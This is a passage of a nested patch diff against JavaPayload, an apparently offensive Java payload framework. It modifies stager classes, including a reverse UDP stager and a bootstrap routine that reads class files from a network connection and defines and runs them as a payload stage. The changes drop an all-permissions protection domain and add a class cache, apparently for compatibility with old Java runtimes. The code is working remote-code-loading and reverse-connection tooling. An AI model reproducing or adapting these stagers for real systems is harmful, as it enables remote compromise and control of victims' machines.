+-			final Permissions permissions = new Permissions();
+-			permissions.add(new AllPermission());
+-			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
+ 			synchronized(this) {
+-				resolveClass(wposClass = defineClass(null, classfile, 0, classfile.length, pd));
++				resolveClass(wposClass = defineClass(classfile, 0, classfile.length));
++				classCache.put(wposClass.getName(), wposClass);
+ 				notifyAll();
+ 			}
+ 			return "9";
+diff U3 javapayload/stager/ReverseUDP.java javapayload/stager/ReverseUDP.java
+--- javapayload/stager/ReverseUDP.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stager/ReverseUDP.java	Thu Jan 15 10:14:12 1970
+@@ -90,7 +90,9 @@
+ 		byte[] clazz = baos.toByteArray();
+ 		PipedInputStream in = new PipedInputStream();
+ 		PipedOutputStream pipedOut = new PipedOutputStream(in);
+-		OutputStream out = (OutputStream) defineClass(null, clazz, 0, clazz.length)
++		Class classObject = defineClass(clazz, 0, clazz.length);
++		classCache.put(classObject.getName(), clazz);
++		OutputStream out = (OutputStream) classObject
+ 			.getConstructor(new Class[] {Class.forName("java.io.OutputStream"), Class.forName("java.net.DatagramSocket"), Class.forName("java.net.InetAddress"), Integer.TYPE})
+ 			.newInstance(new Object[] {pipedOut, ds, remoteAddress, new Integer(remotePort)});
+ 		bootstrap(in, out, parameters);
+diff U3 javapayload/stager/Stager.java javapayload/stager/Stager.java
+--- javapayload/stager/Stager.java	Thu Jan 15 10:14:12 1970
++++ javapayload/stager/Stager.java	Thu Jan 15 10:14:12 1970
+@@ -38,34 +38,48 @@
+ import java.io.InputStream;
+ import java.io.OutputStream;
+ import java.io.PrintStream;
+-import java.net.URL;
+-import java.security.AllPermission;
+-import java.security.CodeSource;
+-import java.security.Permissions;
+-import java.security.ProtectionDomain;
+-import java.security.cert.Certificate;
++import java.util.Hashtable;
++
++import javapayload.stage.Stage;
+ 
+ public abstract class Stager extends ClassLoader {
+ 
++	protected Hashtable classCache = new Hashtable();
++	
++	protected synchronized Class loadClass(String name, boolean resolve) throws ClassNotFoundException {
++		Class c = (Class)classCache.get(name);
++		if (c == null) {
++			c = findSystemClass(name);
++		}
++		if (resolve) {
++			resolveClass(c);
++		}
++		return c;
++	}
++
+ 	protected final void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) {
+ 		try {
+ 			final DataInputStream in = new DataInputStream(rawIn);
+ 			Class clazz;
+-			final Permissions permissions = new Permissions();
+-			permissions.add(new AllPermission());
+-			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
++
+ 			int length = in.readInt();
+ 			do {
+ 				final byte[] classfile = new byte[length];
+ 				in.readFully(classfile);
+-				resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
++				resolveClass(clazz = defineClass(classfile, 0, length));
++				classCache.put(clazz.getName(), clazz);
+ 				length = in.readInt();
+ 				if (length == 0) {
+ 					break;
+ 				}
+ 			} while (length > 0);
++			/* #JDK1.0 */
+ 			final Object stage = clazz.newInstance();
+ 			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
++			/*/
++			final Stage stage = (Stage)clazz.newInstance();
++			stage.start(in, out, parameters);			
++			/**/
+ 		} catch (final Throwable t) {
+ 			t.printStackTrace(new PrintStream(out, true));
+ 		}
+diff U3 javapayload/stage/StreamForwarder.java javapayload/stage/StreamForwarder.java
+--- javapayload/stage/StreamForwarder.java	Sat Jun 25 21:56:22 2011
++++ javapayload/stage/StreamForwarder.java	Sat Jun 25 23:42:08 2011
+@@ -70,7 +70,10 @@
+ 	private final boolean closeOut;
+ 
+ 	public StreamForwarder(InputStream in, OutputStream out, OutputStream stackTraceOut) {
+-		this(in,out,stackTraceOut,true);
++		this.in = in;
++		this.out = out;
++		this.stackTraceOut = stackTraceOut;
++		this.closeOut = true;
+ 	}
+ 	public StreamForwarder(InputStream in, OutputStream out, OutputStream stackTraceOut, boolean closeOut) {
+ 		this.in = in;
